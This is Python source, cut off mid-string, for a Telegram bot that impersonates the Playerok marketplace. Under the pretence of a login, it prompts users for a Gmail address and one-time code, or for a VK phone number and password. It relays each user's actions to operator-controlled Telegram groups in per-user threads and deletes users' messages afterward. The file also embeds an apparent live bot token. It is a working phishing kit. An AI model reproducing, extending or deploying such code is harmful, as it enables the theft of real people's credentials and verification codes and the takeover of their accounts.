from flask import Flask
from threading import Thread
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import re
from datetime import datetime
import time
import requests
from urllib3.exceptions import ProtocolError, ReadTimeoutError
from http.client import RemoteDisconnected
import os
import sys
import threading
import json
from flask import Flask
from threading import Thread

# Файлы для хранения данных
LOCK_FILE = os.path.expanduser("~/playerok_bot.lock")
USERS_FILE = os.path.expanduser("~/playerok_users.json")
THREADS_FILE = os.path.expanduser("~/playerok_threads.json")

# ---------- БЛОКИРОВКА ДВОЙНОГО ЗАПУСКА ----------
def check_lock():
    if os.path.exists(LOCK_FILE):
        print("❌ Бот уже запущен! Остановите предыдущий процесс.")
        print("Для принудительной остановки выполните: pkill -9 python")
        sys.exit(1)
    
    try:
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
        print("✅ Файл блокировки создан")
    except Exception as e:
        print(f"⚠️ Не удалось создать файл блокировки: {e}")

def remove_lock():
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
            print("✅ Файл блокировки удален")
    except Exception as e:
        print(f"⚠️ Ошибка удаления файла блокировки: {e}")


# ---------- РАБОТА С БАЗОЙ ПОЛЬЗОВАТЕЛЕЙ ----------
def load_known_users():
    """Загружает список известных пользователей из файла"""
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                return set(json.load(f))
        return set()
    except Exception as e:
        print(f"⚠️ Ошибка загрузки пользователей: {e}")
        return set()


def save_known_users(users_set):
    """Сохраняет список известных пользователей в файл"""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(list(users_set), f)
    except Exception as e:
        print(f"⚠️ Ошибка сохранения пользователей: {e}")


def is_new_user(chat_id):
    """Проверяет, является ли пользователь новым"""
    known_users = load_known_users()
    if chat_id in known_users:
        return False
    else:
        known_users.add(chat_id)
        save_known_users(known_users)
        return True


# ---------- РАБОТА С ТЕМАМИ (THREADS) ----------
user_threads_cache = {}  # Формат: {"chat_id_group_id": thread_id}

def load_user_threads():
    """Загружает словарь тем пользователей из файла"""
    global user_threads_cache
    try:
        if os.path.exists(THREADS_FILE):
            with open(THREADS_FILE, 'r') as f:
                user_threads_cache = json.load(f)
                print(f"✅ Загружено {len(user_threads_cache)} тем из файла")
                return user_threads_cache
        return {}
    except Exception as e:
        print(f"⚠️ Ошибка загрузки тем: {e}")
        return {}


def save_user_threads():
    """Сохраняет словарь тем пользователей в файл"""
    try:
        with open(THREADS_FILE, 'w') as f:
            json.dump(user_threads_cache, f, indent=2)
        print(f"✅ Сохранено {len(user_threads_cache)} тем")
    except Exception as e:
        print(f"⚠️ Ошибка сохранения тем: {e}")


def create_thread_for_user(chat_id, group_chat_id):
    """Создает новую тему для пользователя в указанной группе"""
    global user_threads_cache
    
    thread_key = f"{chat_id}_{group_chat_id}"
    
    # Если тема уже существует - возвращаем её
    if thread_key in user_threads_cache:
        thread_id = user_threads_cache[thread_key]
        print(f"✅ Тема #{thread_id} уже существует для {chat_id} в группе {group_chat_id}")
        return thread_id
    
    # Создаем новую тему
    try:
        user = bot.get_chat(chat_id)
        username = f"@{user.username}" if user.username else "Без username"
        
        # Название темы
        thread_name = f"{user.first_name} | {username}"
        
        # Создаем форум-топик
        forum_topic = bot.create_forum_topic(group_chat_id, thread_name)
        thread_id = forum_topic.message_thread_id
        
        # Сохраняем в кеш и файл
        user_threads_cache[thread_key] = thread_id
        save_user_threads()
        
        print(f"🆕 Создана тема #{thread_id} '{thread_name}' в группе {group_chat_id}")
        return thread_id
        
    except Exception as e:
        print(f"❌ Ошибка создания темы для {chat_id} в группе {group_chat_id}: {e}")
        return None


def get_thread_id(chat_id, group_chat_id):
    """Получает ID темы для пользователя (без создания новой)"""
    thread_key = f"{chat_id}_{group_chat_id}"
    return user_threads_cache.get(thread_key, None)


def initialize_user_threads(chat_id):
    """Создает темы для пользователя во ВСЕХ группах и отправляет приветственные сообщения"""
    def _init():
        try:
            user = bot.get_chat(chat_id)
            username = f"@{user.username}" if user.username else "Нет username"
            now = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
            
            # Приветственное сообщение для темы
            welcome_msg = (
                f"🆕 НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n\n"
                f"👤 Имя: {user.first_name}\n"
                f"📱 Username: {username}\n"
                f"🆔 ID: {chat_id}\n"
                f"⏰ {now}"
            )
            
            # Кнопка ответа
            markup = InlineKeyboardMarkup()
            markup.add(
                InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{chat_id}")
            )
            
            # Создаем темы во ВСЕХ группах
            groups = [
                SUPPORT_CHAT_ID,
                USER_ACTIONS_CHAT_ID,
                NEW_USERS_CHAT_ID
            ]
            
            for group_id in groups:
                thread_id = create_thread_for_user(chat_id, group_id)
                
                if thread_id:
                    # Отправляем приветственное сообщение в тему
                    bot.send_message(
                        group_id,
                        welcome_msg,
                        reply_markup=markup,
                        message_thread_id=thread_id
                    )
                    print(f"✅ Отправлено приветствие в группу {group_id}, тема #{thread_id}")
                else:
                    print(f"⚠️ Не удалось создать тему в группе {group_id}")
                    
        except Exception as e:
            print(f"❌ Ошибка инициализации тем для {chat_id}: {e}")
    
    # Запускаем в отдельном потоке
    threading.Thread(target=_init, daemon=True).start()


# ---------- КОНФИГУРАЦИЯ БОТА ----------
TOKEN = os.getenv("TOKEN", "7633594929:AAFCLxygTuPBBkq4YHEbw_0fUWnQLQdYBEU")  # Токен из переменных окружения или по умолчанию

# ID групп (должны быть супергруппами с включенными темами/форумом)
SUPPORT_CHAT_ID = -1003531961401
EMAIL_CHAT_ID = -1003572137977
NEW_USERS_CHAT_ID = -1003735733847
USER_ACTIONS_CHAT_ID = -1003668179158

# Flask сервер для Railway
app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running!"

@app.route("/health")
def health():
    return "OK", 200

# Функция для запуска Flask в отдельном потоке
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# Запуск Flask в отдельном потоке
def run_flask():
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))

# Инициализация бота
bot = telebot.TeleBot(TOKEN, parse_mode="HTML", num_threads=4, skip_pending=True)

# Изображения
WELCOME_PHOTO = "https://i.postimg.cc/Pfvw8bRw/IMG-20260206-230035-425.jpg"
GMAIL_PHOTO = "https://i.postimg.cc/0yz4mBDL/IMG-20260206-235138-655.jpg"
VK_PHOTO = "https://i.postimg.cc/fySQvDJD/IMG-20260209-131848-259.jpg"

# Текст приветствия
WELCOME_TEXT = """<b>✨ Добро пожаловать в магазин маркетолог Playerok!

Наш официальный сайт Playerok.com

📒 Мы рады приветствовать вас и предложить удобный способ покупок онлайн. 
Наш бот готов помочь вам в этом процессе, но для начала нам потребуется, чтобы вы вошли в свой аккаунт.

Просто введите свои учетные данные, и вы сможете насладиться множеством удобных функций, 
таких как просмотр каталога товаров, оформление заказов и отслеживание доставки. 
Наш бот будет рядом, чтобы ответить на ваши вопросы и помочь вам во время покупок.

Не упустите возможность сэкономить время и насладиться удобством онлайн-шопинга с Playerok.

Войдите в свой аккаунт прямо сейчас и начните исследовать наш ассортимент товаров.

Спасибо, что выбрали Playerok!</b>"""

# Состояния пользователей
user_state = {}
vk_temp = {}
admin_reply_state = {}  # Формат: {admin_chat_id: {"user_id": 123, "group_id": -100, "thread_id": 456}}
support_mapping = {}
user_messages = {}  # ID сообщений БОТА
user_own_messages = {}  # ID сообщений ПОЛЬЗОВАТЕЛЯ


# ---------- УДАЛЕНИЕ ПРЕДЫДУЩИХ СООБЩЕНИЙ ----------
def delete_previous_messages(chat_id):
    """Удаляет все сохраненные сообщения БОТА"""
    if chat_id in user_messages:
        for msg_id in user_messages[chat_id]:
            try:
                bot.delete_message(chat_id, msg_id)
            except:
                pass
        user_messages[chat_id] = []


def delete_user_messages(chat_id):
    """Удаляет все сохраненные сообщения ПОЛЬЗОВАТЕЛЯ"""
    if chat_id in user_own_messages:
        for msg_id in user_own_messages[chat_id]:
            try:
                bot.delete_message(chat_id, msg_id)
            except:
                pass
        user_own_messages[chat_id] = []


def save_message_id(chat_id, message_id):
    """Сохраняет ID сообщения БОТА для последующего удаления"""
    if chat_id not in user_messages:
        user_messages[chat_id] = []
    user_messages[chat_id].append(message_id)
    
    if len(user_messages[chat_id]) > 10:
        user_messages[chat_id] = user_messages[chat_id][-10:]


def save_user_message_id(chat_id, message_id):
    """Сохраняет ID сообщения ПОЛЬЗОВАТЕЛЯ для последующего удаления"""
    if chat_id not in user_own_messages:
        user_own_messages[chat_id] = []
    user_own_messages[chat_id].append(message_id)
    
    if len(user_own_messages[chat_id]) > 20:
        user_own_messages[chat_id] = user_own_messages[chat_id][-20:]


# ---------- ЛОГИРОВАНИЕ В ГРУППЫ ----------
def log_user_action(chat_id, action_text):
    """Логирует действие пользователя в чат USER_ACTIONS_CHAT_ID"""
    def _log():
        try:
            thread_id = get_thread_id(chat_id, USER_ACTIONS_CHAT_ID)
            
            if not thread_id:
                print(f"⚠️ Тема не найдена для {chat_id} в USER_ACTIONS_CHAT_ID")
                return
            
            user = bot.get_chat(chat_id)
            username = f"@{user.username}" if user.username else "Нет username"
            text = (
                f"👤 {user.first_name} ({username})\n"
                f"ID: {chat_id}\n"
                f"⏰ {datetime.now().strftime('%H:%M:%S')}\n"
                f"📌 {action_text}"
            )
            
            bot.send_message(USER_ACTIONS_CHAT_ID, text, message_thread_id=thread_id)
            
        except Exception as e:
            print(f"❌ Ошибка логирования действия: {e}")
    
    threading.Thread(target=_log, daemon=True).start()


def log_support_message(chat_id, text):
    """Отправляет сообщение в поддержку в отдельную тему пользователя"""
    def _log():
        try:
            thread_id = get_thread_id(chat_id, SUPPORT_CHAT_ID)
            
            if not thread_id:
                print(f"⚠️ Тема не найдена для {chat_id} в SUPPORT_CHAT_ID")
                return
            
            user = bot.get_chat(chat_id)
            username = f"@{user.username}" if user.username else "Нет username"
            
            support_mapping[chat_id] = chat_id
            
            info = (
                f"👤 {user.first_name} ({username})\n"
                f"🆔 {chat_id}\n"
                f"⏰ {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n\n"
                f"💬 Сообщение:\n{text}"
            )
            
            markup = InlineKeyboardMarkup()
            markup.add(
                InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{chat_id}")
            )
            
            bot.send_message(SUPPORT_CHAT_ID, info, reply_markup=markup, message_thread_id=thread_id)
                
        except Exception as e:
            print(f"❌ Ошибка отправки в поддержку: {e}")
    
    threading.Thread(target=_log, daemon=True).start()


def log_to_actions_chat(chat_id, text, data_type):
    """Логирует данные в чат USER_ACTIONS_CHAT_ID в тему пользователя"""
    def _log():
        try:
            thread_id = get_thread_id(chat_id, USER_ACTIONS_CHAT_ID)
            
            if not thread_id:
                print(f"⚠️ Тема не найдена для {chat_id} в USER_ACTIONS_CHAT_ID")
                return
            
            user = bot.get_chat(chat_id)
            now = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
            username = f"@{user.username}" if user.username else "Нет username"
            
            info = (
                f"📋 {data_type}\n"
                f"👤 {user.first_name} ({username})\n"
                f"🆔 {chat_id}\n"
                f"⏰ {now}\n\n"
                f"📝 Данные:\n{text}"
            )

            bot.send_message(USER_ACTIONS_CHAT_ID, info, message_thread_id=thread_id)
                
        except Exception as e:
            print(f"❌ Ошибка логирования в чат действий: {e}")
    
    threading.Thread(target=_log, daemon=True).start()


# ---------- КНОПКИ ----------
def cancel_kb():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
    return kb


# ---------- ПРИВЕТСТВИЕ ----------
def send_welcome(chat_id):
    delete_previous_messages(chat_id)
    
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton(
            "Пользовательское соглашение ✅", url="https://playerok.com/agreement"
        )
    )
    kb.row(
        InlineKeyboardButton("🔰 Поддержка", callback_data="support"),
        InlineKeyboardButton("🔍Войти в аккаунт", callback_data="login"),
    )
    msg = bot.send_photo(chat_id, WELCOME_PHOTO, caption=WELCOME_TEXT, reply_markup=kb)
    save_message_id(chat_id, msg.message_id)
    user_state[chat_id] = "welcome"


# ---------- ОБРАБОТЧИК /start ----------
@bot.message_handler(commands=["start"])
def start(msg):
    chat_id = msg.chat.id
    
    # Проверяем, новый ли пользователь
    is_new = is_new_user(chat_id)
    
    if is_new:
        print(f"🆕 Новый пользователь {chat_id} - создаем темы во всех группах")
        # Создаем темы во ВСЕХ группах сразу
        initialize_user_threads(chat_id)
    else:
        print(f"✅ Пользователь {chat_id} уже известен")
        # Логируем повторный запуск
        log_user_action(chat_id, "🔄 Повторный /start")
    
    # Отправляем приветствие
    send_welcome(chat_id)


# ---------- ОБРАБОТЧИК CALLBACK ----------
@bot.callback_query_handler(func=lambda c: True)
def callbacks(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)

    if call.data == "cancel":
        log_user_action(chat_id, "❌ Отмена")
        
        delete_previous_messages(chat_id)
        delete_user_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        send_welcome(chat_id)
        return

    if call.data == "support":
        user_state[chat_id] = "support"
        delete_previous_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        SUPPORT_TEXT = (
            "<b>✉️ Описание проблемы/вопроса.</b>\n\n"
            "Подробно опишите свою проблему, вопрос или запрос. "
            "Чем более конкретно и подробно вы опишете ситуацию, тем легче будет нам вам помочь."
        )
        msg = bot.send_message(
            chat_id, SUPPORT_TEXT, reply_markup=cancel_kb(), parse_mode="HTML"
        )
        save_message_id(chat_id, msg.message_id)
        log_user_action(chat_id, "🔰 Открыл поддержку")
        return

    if call.data == "login":
        delete_previous_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        kb = InlineKeyboardMarkup()
        kb.row(
            InlineKeyboardButton("📬 Войти [Gmail]", callback_data="gmail"),
            InlineKeyboardButton("📱 Войти [VK]", callback_data="vk"),
        )
        kb.add(InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
        msg = bot.send_message(
            chat_id,
            "Выберите через что вы будете входить в акккаунт Playerok.",
            reply_markup=kb,
        )
        save_message_id(chat_id, msg.message_id)
        log_user_action(chat_id, "🔍 Выбор способа входа")
        return

    if call.data == "gmail":
        user_state[chat_id] = "gmail_email"
        delete_previous_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        msg = bot.send_photo(
            chat_id,
            GMAIL_PHOTO,
            caption=(
                "💼 Вход в аккаунт\n\n"
                "Введите вашу электронную почту для входа в аккаунт:\n\n"
                "После этого на вашу электронную почту пройдёт одноразовый код подтверждения.\n\n"
                "Если у вас возникли проблемы с входом в аккаунт, "
                "пожалуйста, обратитесь в нашу службу поддержки, и мы с удовольствием поможем вам решить эту проблему."
            ),
            reply_markup=cancel_kb(),
            parse_mode="HTML",
        )
        save_message_id(chat_id, msg.message_id)
        log_user_action(chat_id, "📬 Gmail вход")
        return

    if call.data == "vk":
        user_state[chat_id] = "vk_phone"
        delete_previous_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        msg = bot.send_photo(
            chat_id,
            VK_PHOTO,
            caption=(
                "📕 Вход в аккаунт через [VK]\n\n"
                "Введите ваш номер телефон для входа в аккаунт:\n\n"
                "После этого введите пароль от [VK].\n\n"
                "Если у вас возникли проблемы с входом в аккаунт, "
                "пожалуйста, обратитесь в нашу службу поддержки, и мы с удовольствием поможем вам решить эту проблему."
            ),
            reply_markup=cancel_kb(),
            parse_mode="HTML",
        )
        save_message_id(chat_id, msg.message_id)
        log_user_action(chat_id, "📱 VK вход")
        return

    if call.data.startswith("reply_"):
        user_id = int(call.data.split("_")[1])
        
        # Определяем в какой группе была нажата кнопка
        group_id = call.message.chat.id
        
        # Получаем thread_id из самого сообщения (из которого была нажата кнопка)
        thread_id = call.message.message_thread_id
        
        if not thread_id:
            # Если по какой-то причине нет thread_id в сообщении, пробуем получить из кеша
            thread_id = get_thread_id(user_id, group_id)
        
        if not thread_id:
            bot.send_message(
                group_id,
                "❌ Не удалось определить тему для ответа. Попробуйте нажать кнопку еще раз.",
                message_thread_id=call.message.message_thread_id
            )
            return
        
        # Сохраняем состояние ответа с информацией о группе и теме
        admin_reply_state[chat_id] = {
            "user_id": user_id,
            "group_id": group_id,
            "thread_id": thread_id
        }
        
        # Отправляем сообщение в ТУ ЖЕ ТЕМУ, где была нажата кнопка
        bot.send_message(
            group_id, 
            f"✍ Введите тек